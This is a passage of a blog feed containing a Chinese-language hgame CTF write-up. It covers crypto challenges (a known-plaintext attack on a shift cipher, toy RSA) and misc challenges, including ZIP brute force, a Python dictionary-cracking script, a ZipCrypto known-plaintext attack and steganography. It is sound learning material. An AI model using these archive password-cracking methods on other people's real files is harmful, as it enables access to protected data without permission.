class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\">img=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./Dancing_Line.bmp&#x27;</span>)</span><br><span class=\"line\">w,h=img.size</span><br><span class=\"line\"><span class=\"comment\">#print(w,h)</span></span><br><span class=\"line\">pos=[]</span><br><span class=\"line\">pos_all=[]</span><br><span class=\"line\">t=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(w):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(h):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> img.getpixel((i,j))!=(<span class=\"number\">255</span>,<span class=\"number\">255</span>,<span class=\"number\">255</span>):</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> img.getpixel((i,j))==(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>):</span><br><span class=\"line\">\t\t\t\tpos.append((i,j))</span><br><span class=\"line\">\t\t\tpos_all.append((i,j))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#print(pos)</span></span><br><span class=\"line\"><span class=\"comment\">#print(pos_all)</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"built_in\">len</span>(pos_all)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> pos_all[k][<span class=\"number\">0</span>]-pos_all[k-<span class=\"number\">1</span>][<span class=\"number\">0</span>]==<span class=\"number\">0</span>:</span><br><span class=\"line\">\t\tt=t+<span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> pos_all[k][<span class=\"number\">1</span>]-pos_all[k-<span class=\"number\">1</span>][<span class=\"number\">1</span>]==<span class=\"number\">0</span>:</span><br><span class=\"line\">\t\tt=t+<span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">t=<span class=\"built_in\">int</span>(t,<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(t.to_bytes((t.bit_length() + <span class=\"number\">7</span>) // <span class=\"number\">8</span>, <span class=\"string\">&#x27;big&#x27;</span>).decode())</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"english-novel\"><a class=\"anchor\" href=\"#english-novel\">#</a> English Novel</h3>\n<p>做是做出来了，就是原来写的脚本稀烂，由于标点符号的原因，整理出来的 keys，有些地方不太对，这就导致我最开始写的脚本，得到的 flag 其实是长这样的： <code>hgame&#123;V0_y0u_kn0w_'En0wn-pla1ntext_derzwn'?&#125;</code> <br />\n(￣▽￣)&quot;</p>\n<p>然后我直接猜出最终的 flag... 讲真挺好猜的<br />\n不过看过别人的 wp 之后，我就在原基础上改善了（现在没问题了）</p>\n<p>这道题思路其实很简单，<br />\n题目给了我们两个文件夹，一个 original，一个 encrypt，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1mbGFnLWs4NGZ1aTB3eDYwMmEyNzVhLnhuLS1lbmNlbmNyeXB0LWpoN3EucHk=\">还给了一个 flag.enc 和 encrypt.py</span><br />\n 首先都打开来看看，original 里面是打乱的 English Novel 的原文，encrypt 里面大概就是通过某种加密得到的打乱的密文，flag.enc 里面大概就是用同样方法加密得到的 flag， encrypt.py 就是加密的方法</p>\n<p>打开 encrypt.py 看看，其实就是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mi>m</mi><mo>+</mo><mi>k</mi><mo stretchy=\"false\">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mn>26</mn></mrow><annotation encoding=\"application/x-tex\">c=(m+k) mod 26</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">26</span></span></span></span><br />\n 那解密就是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mi>c</mi><mo>−</mo><mi>k</mi><mo stretchy=\"false\">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mn>26</mn></mrow><annotation encoding=\"application/x-tex\">m=(c-k) mod 26</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">26</span></span></span></span> （c 为密文，m 为明文，k 为密钥）<br />\n所以显然我们的任务就是得到这个密钥 k，然后解密 flag.enc 里的密文</p>\n<p>而题目把一大堆明文和密文都给我们了，所以就是已知明文攻击，<br />\n所以， <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mi>c</mi><mo>−</mo><mi>m</mi><mo stretchy=\"false\">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mn>26</mn></mrow><annotation encoding=\"application/x-tex\">k=(c-m) mod 26</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">26</span></span></span></span><br />\n 关键点就在怎么把打乱 encrypt 和 original 一一对应起来，而且要排除标点符号对求 key 的干扰<br />\n因为仔细看 encrypt.py 的话，标点符号虽然不会参与加密，但是还是会占据一个 key 的位置</p>\n<p>用 isalpha () 的功能判断字母，然后把字母替换成 &quot;*&quot;，保留标点符号，这样得到的字符串相当于一个标准的模板，对于对应的 original 和 encrypt 来说，他们的 template 都是一样的，这样就能把原文和密文对应起来。<br />\n找到了对应的原文和密文，解得正确的 key 就比较容易了（不过要记得排除标点符号的干扰）<br />\nexp 如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 函数功能：把字母变成‘*’，保留标点符号</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_feature</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span>.join([<span class=\"string\">&#x27;*&#x27;</span> <span class=\"keyword\">if</span> c.isalpha() <span class=\"keyword\">else</span> c <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> s]) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 用original文件夹初始化template，并将原文保存在txts_ori里面</span></span><br><span class=\"line\">path_ori=<span class=\"string\">&#x27;original&#x27;</span></span><br><span class=\"line\">files_ori=os.listdir(path_ori)</span><br><span class=\"line\">template=[]</span><br><span class=\"line\">txts_ori = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> files_ori:</span><br><span class=\"line\">\tposition = path_ori+<span class=\"string\">&#x27;\\\\&#x27;</span>+ file</span><br><span class=\"line\">\t<span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(position, <span class=\"string\">&quot;r&quot;</span>,encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">\t\tdata = f.read()</span><br><span class=\"line\">\t\tm=get_feature(data)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(m)!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> m <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> template:</span><br><span class=\"line\">\t\t\ttxts_ori.append(data)</span><br><span class=\"line\">\t\t\ttemplate.append(m)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 处理encrypt文件夹内的数据，在template里匹配对应的原文，得到对应的密钥</span></span><br><span class=\"line\">keys=[-<span class=\"number\">1</span>]*<span class=\"number\">410</span></span><br><span class=\"line\">path_enc=<span class=\"string\">&#x27;encrypt&#x27;</span></span><br><span class=\"line\">files_enc=os.listdir(path_enc)</span><br><span class=\"line\"><span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> files_enc:</span><br><span class=\"line\">\tposition = path_enc+<span class=\"string\">&#x27;\\\\&#x27;</span>+ file</span><br><span class=\"line\">\t<span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(position, <span class=\"string\">&quot;r&quot;</span>,encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">\t\tdata = f.read()</span><br><span class=\"line\">\t\tm=get_feature(data)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(m)!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> m <span class=\"keyword\">in</span> template:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(data)):</span><br><span class=\"line\">\t\t\t\tk=((<span class=\"built_in\">ord</span>(data[i])-<span class=\"built_in\">ord</span>(txts_ori[template.index(m)][i]))%<span class=\"number\">26</span>)</span><br><span class=\"line\">\t\t\t\tj=i%(<span class=\"built_in\">len</span>(keys))</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#保证每次写入keys时该位置没有写入过，且对应密文不是标点符号</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> keys[j]==-<span class=\"number\">1</span> <span class=\"keyword\">and</span> m[i]==<span class=\"string\">&#x27;*&#x27;</span>:</span><br><span class=\"line\">\t\t\t\t\tkeys[j]=k</span><br><span class=\"line\"><span class=\"comment\"># 用keys解密</span></span><br><span class=\"line\">enc=<span class=\"string\">&quot;xaawr&#123;B0_d0l_cs0m_&#x27;Pp0mn-odn1vpabt_deqzcq&#x27;?&#125;&quot;</span></span><br><span class=\"line\">result = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(enc)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> enc[i].isupper():</span><br><span class=\"line\">\t\tresult += <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(enc[i]) - keys[i] - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>)) % <span class=\"number\">26</span> + <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> enc[i].islower():</span><br><span class=\"line\">\t\tresult += <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(enc[i]) - keys[i] - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>)) % <span class=\"number\">26</span> + <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tresult += enc[i]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"easy-rsa\"><a class=\"anchor\" href=\"#easy-rsa\">#</a> Easy RSA</h3>\n<p>这道题，还是不细说了，属于是最最最基本的 RSA 了，<br />\n该给的全都给了，连 p, q 都直接给了<br />\n exp:<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\">string=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> (e,p,q,c) <span class=\"keyword\">in</span> [(<span class=\"number\">12433</span>, <span class=\"number\">149</span>, <span class=\"number\">197</span>, <span class=\"number\">104</span>), (<span class=\"number\">8147</span>, <span class=\"number\">131</span>, <span class=\"number\">167</span>, <span class=\"number\">6633</span>), (<span class=\"number\">10687</span>, <span class=\"number\">211</span>, <span class=\"number\">197</span>, <span class=\"number\">35594</span>), (<span class=\"number\">19681</span>, <span class=\"number\">131</span>, <span class=\"number\">211</span>, <span class=\"number\">15710</span>), (<span class=\"number\">33577</span>, <span class=\"number\">251</span>, <span class=\"number\">211</span>, <span class=\"number\">38798</span>), (<span class=\"number\">30241</span>, <span class=\"number\">157</span>, <span class=\"number\">251</span>, <span class=\"number\">35973</span>), (<span class=\"number\">293</span>, <span class=\"number\">211</span>, <span class=\"number\">157</span>, <span class=\"number\">31548</span>), (<span class=\"number\">26459</span>, <span class=\"number\">179</span>, <span class=\"number\">149</span>, <span class=\"number\">4778</span>), (<span class=\"number\">27479</span>, <span class=\"number\">149</span>, <span class=\"number\">223</span>, <span class=\"number\">32728</span>), (<span class=\"number\">9029</span>, <span class=\"number\">223</span>, <span class=\"number\">137</span>, <span class=\"number\">20696</span>), (<span class=\"number\">4649</span>, <span class=\"number\">149</span>, <span class=\"number\">151</span>, <span class=\"number\">13418</span>), (<span class=\"number\">11783</span>, <span class=\"number\">223</span>, <span class=\"number\">251</span>, <span class=\"number\">14239</span>), (<span class=\"number\">13537</span>, <span class=\"number\">179</span>, <span class=\"number\">137</span>, <span class=\"number\">11702</span>), (<span class=\"number\">3835</span>, <span class=\"number\">167</span>, <span class=\"number\">139</span>, <span class=\"number\">20051</span>), (<span class=\"number\">30983</span>, <span class=\"number\">149</span>, <span class=\"number\">227</span>, <span class=\"number\">23928</span>), (<span class=\"number\">17581</span>, <span class=\"number\">157</span>, <span class=\"number\">131</span>, <span class=\"number\">5855</span>), (<span class=\"number\">35381</span>, <span class=\"number\">223</span>, <span class=\"number\">179</span>, <span class=\"number\">37774</span>), (<span class=\"number\">2357</span>, <span class=\"number\">151</span>, <span class=\"number\">223</span>, <span class=\"number\">1849</span>), (<span class=\"number\">22649</span>, <span class=\"number\">211</span>, <span class=\"number\">229</span>, <span class=\"number\">7348</span>), (<span class=\"number\">1151</span>, <span class=\"number\">179</span>, <span class=\"number\">223</span>, <span class=\"number\">17982</span>), (<span class=\"number\">8431</span>, <span class=\"number\">251</span>, <span class=\"number\">163</span>, <span class=\"number\">30226</span>), (<span class=\"number\">38501</span>, <span class=\"number\">193</span>, <span class=\"number\">211</span>, <span class=\"number\">30559</span>), (<span class=\"number\">14549</span>, <span class=\"number\">211</span>, <span class=\"number\">151</span>, <span class=\"number\">21143</span>), (<span class=\"number\">24781</span>, <span class=\"number\">239</span>, <span class=\"number\">241</span>, <span class=\"number\">45604</span>), (<span class=\"number\">8051</span>, <span class=\"number\">179</span>, <span class=\"number\">131</span>, <span class=\"number\">7994</span>), (<span class=\"number\">863</span>, <span class=\"number\">181</span>, <span class=\"number\">131</span>, <span class=\"number\">11493</span>), (<span class=\"number\">1117</span>, <span class=\"number\">239</span>, <span class=\"number\">157</span>, <span class=\"number\">12579</span>), (<span class=\"number\">7561</span>, <span class=\"number\">149</span>, <span class=\"number\">199</span>, <span class=\"number\">8960</span>), (<span class=\"number\">19813</span>, <span class=\"number\">239</span>, <span class=\"number\">229</span>, <span class=\"number\">53463</span>), (<span class=\"number\">4943</span>, <span class=\"number\">131</span>, <span class=\"number\">157</span>, <span class=\"number\">14606</span>), (<span class=\"number\">29077</span>, <span class=\"number\">191</span>, <span class=\"number\">181</span>, <span class=\"number\">33446</span>), (<span class=\"number\">18583</span>, <span class=\"number\">211</span>, <span class=\"number\">163</span>, <span class=\"number\">31800</span>), (<span class=\"number\">30643</span>, <span class=\"number\">173</span>, <span class=\"number\">191</span>, <span class=\"number\">27293</span>), (<span class=\"number\">11617</span>, <span class=\"number\">223</span>, <span class=\"number\">251</span>, <span class=\"number\">13448</span>), (<span class=\"number\">19051</span>, <span class=\"number\">191</span>, <span class=\"number\">151</span>, <span class=\"number\">21676</span>), (<span class=\"number\">18367</span>, <span class=\"number\">179</span>, <span class=\"number\">157</span>, <span class=\"number\">14139</span>), (<span class=\"number\">18861</span>, <span class=\"number\">149</span>, <span class=\"number\">191</span>, <span class=\"number\">5139</span>), (<span class=\"number\">9581</span>, <span class=\"number\">211</span>, <span class=\"number\">193</span>, <span class=\"number\">25595</span>)]:</span><br><span class=\"line\">\td = <span class=\"built_in\">int</span>(gmpy2.invert(e, (p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)))</span><br><span class=\"line\">\tm = <span class=\"built_in\">pow</span>(c, d, p*q)</span><br><span class=\"line\">\tstring.append(long_to_bytes(m).decode())</span><br><span class=\"line\">Str=<span class=\"string\">&#x27;&#x27;</span>.join(string)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(Str)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"这个压缩包有点麻烦\"><a class=\"anchor\" href=\"#这个压缩包有点麻烦\">#</a> 这个压缩包有点麻烦</h3>\n<p>这道题属实是把那些，基本的有关压缩包的方法都涉及到了，挺全面的入门题</p>\n<h4 id=\"暴力破解\"><a class=\"anchor\" href=\"#暴力破解\">#</a> 暴力破解</h4>\n<p>打开压缩包，三个文件都被加密，不太正常，所以考虑暴力破解或者是伪加密能直接解出。<br />\n用 010 打开，文件最后出现提示：</p>\n<blockquote>\n<p>Pure numeric passwords within 6 digits are not safe!</p>\n</blockquote>\n<p>所以用 ARCHPR 暴力破解，范围仅勾选数字，得到密码：483279</p>\n<h4 id=\"字典攻击\"><a class=\"anchor\" href=\"#字典攻击\">#</a> 字典攻击</h4>\n<p>上一轮的密码解压得到三个文件：flag.zip、password-note.txt、README.txt<br />\n 要解压 flag.zip 又需要密码，打开 README.txt 看到提示：</p>\n<blockquote>\n<p>I don't know if it's a good idea to write down all the passwords.</p>\n</blockquote>\n<p>显然 passwords 可能的都被写在 password-note.txt 里面了<br />\n用 ARCHPR 的字典攻击即可，得到密码：&amp;-`;qpCKliw2yTR\\</p>\n<p>之后又尝试写了一个脚本，运行也可以得到密码：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\">zip_file = zipfile.ZipFile(<span class=\"string\">&#x27;flag.zip&#x27;</span>)</span><br><span class=\"line\">zip_list = zip_file.namelist()</span><br><span class=\"line\">f=<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;password-note.txt&#x27;</span>, <span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\">lines = f.readlines()</span><br><span class=\"line\"><span class=\"keyword\">for</span> password <span class=\"keyword\">in</span> lines:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        zip_file.extractall(path=<span class=\"string\">&#x27;Test&#x27;</span>, pwd=password[:-<span class=\"number\">1</span>].encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the password is &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(password[:-<span class=\"number\">1</span>]))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"comment\">#print(&quot;the password is &#123;&#125;&quot;.format(password[:-1]))</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"明文攻击\"><a class=\"anchor\" href=\"#明文攻击\">#</a> 明文攻击</h4>\n<p>解压后又得到了一个 flag.zip 和 README.txt... (/▽＼)<br />\n flag.zip 中的内容一样被加密，其中包含 flag.jpg 和 README.txt<br />\n 仔细观察发现，两个 README.txt 的大小都是 68KB，所以考虑可能是明文攻击</p>\n<p>再看一下 README.txt，有提示</p>\n<blockquote>\n<p>If you don't like to spend time compressing files, just stores them.</p>\n</blockquote>\n<p>联系 flag.zip 的加密算法：ZipCrypto Store，已经基本可以确定是明文了，</p>\n<p>把给的 README.txt 用 Zip 的存储方式加密，打开对比两个 README.txt 的 CRC 值，<br />\n均为 966AC0E8</p>\n<p>再次使用 ARCHPR，选择明文攻击，<br />\n等待 1~2 分钟左右点击停止即可，不用等它执行完</p>\n<h4 id=\"伪加密\"><a class=\"anchor\" href=\"#伪加密\">#</a> 伪加密</h4>\n<p>明文攻击后得到了去除密码的一个 zip，<br />\n解压得到 flag.jpg 如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437720/Typera/2023/04/11a450d036a1c818089a7374c1f615a3.jpg\" alt=\"hgameM10\" /><br />\n 实际上从 7z 里面是能直接再点开这个 flag.jpg 的，可以看到里面还有一个 flag.jpg (￣_,￣)<br />\n 显然这个 flag.jpg 后面还藏了一个压缩包，使用 binwalk 分离，得到 4FC5.zip</p>\n<p>虽然有点奇怪，这里 7z 为啥不能直接打开这个新的压缩包，但尝试之后发现这个确实是伪加密<br />\n直接更改下图选中内容为 00 即可<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437699/Typera/2023/04/63704e239d39fc6a92fc0cb525370a7b.png\" alt=\"image-20230425234814596\" /></p>\n<p>终于得到了 flag：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437761/Typera/2023/04/53c11a8e13bbe5c3adfdef057ed8493c.png\" alt=\"image-20230425234917756\" /></p>\n<h3 id=\"好康的流量\"><a class=\"anchor\" href=\"#好康的流量\">#</a> 好康的流量</h3>\n<p>Wireshark 打开，右键 -&gt; 追踪流 -&gt;TCP 流，得到 base64 格式的图片文件：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437776/Typera/2023/04/c529efa42a73e54e0034029e844f57ca.png\" alt=\"image-20230425234931156\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudG9vbG5iLmNvbS90b29scy9iYXNlNjRUb0ltYWdlcy5odG1s\">在线 base64 转换图片</span>得到：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437788/Typera/2023/04/7299c09dac948f983d1c5126055c377d.png\" alt=\"image-20230425234943176\" /></p>\n<p>stegsolve 打开，G2 得到一个条形码：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437796/Typera/2023/04/473ee4ccb1baae2f6d8baebff4eb969b.png\" alt=\"image-20230425234952577\" /><br />\n 保存后，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZW1vLmR5bmFtc29mdC5jb20vYmFyY29kZS1yZWFkZXIv\">在线扫描图片</span>得到前半段 flag  <code>hgame&#123;ez_1mg_</code></p>\n<p>然后在 Analyse-&gt;Data Extract 里面，<br />\n按下图所示操作，可以得到后半 flag  <code>Steg4n0graphy&#125;</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437806/Typera/2023/04/c026469fb7ab3fceba720421bc3cea72.png\" alt=\"image-20230425235001793\" /></p>\n<h3 id=\"群青其实是幽灵东京\"><a class=\"anchor\" href=\"#群青其实是幽灵东京\">#</a> 群青 (其实是幽灵东京）</h3>\n<p>拿到.wav 文件，发现属性里藏了提示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437816/Typera/2023/04/61191b2c8ce2754adbb5f4270499d7fc.png\" alt=\"image-20230425235012882\" /><br />\n 提示使用用 SilentEye，<br />\n直接 Decode 显示不正确，所以猜测要使用密码</p>\n<p>Audacity 打开，查看频谱图发现：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437826/Typera/2023/04/9b37356f52ea60ba659337e1615d5527.png\" alt=\"image-20230425235021424\" /><br />\n 猜测大概就是 key 了：Yoasobi<br />\n 解密得到一串网址，貌似是一个音频文件的地址<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437834/Typera/2023/04/097e85d689cebdbc315a2e1d74bf20c1.png\" alt=\"image-20230425235030317\" /><br />\n 访问下载得音频文件 S_S_T_V.wav</p>\n<p>搜索 SSTV，得知：SSTV（Slow-scan television）是一种图像传输方法，主要由业余无线电操作员使用，通过单色或彩色无线电发送和接收静态图像。</p>\n<p>原本想使用 RX-SSTV 解码器，但是貌似我的电脑上还需要安装一个叫 Virtual Audio Cable 的虚拟声卡，实在是太麻烦了 (╯□╰)<br />\n 所以我就干脆在手机上下载了 Robot36，用电脑播放音频，手机接听，最后得到这样一张图<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437848/Typera/2023/04/267cd6c07e0bbbdcb3b0b57595089963.png\" alt=\"image-20230425235041961\" /></p>\n<p>然后扫码得到 flag： <code>hgame&#123;1_c4n_5ee_the_wav&#125;</code></p>\n",
            "tags": [
                "Python",
                "Crypto",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/SCTF%E5%A4%8D%E7%8E%B0/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/SCTF%E5%A4%8D%E7%8E%B0/",
            "title": "SCTF复现",
            "date_published": "2022-01-29T16:18:22.000Z",
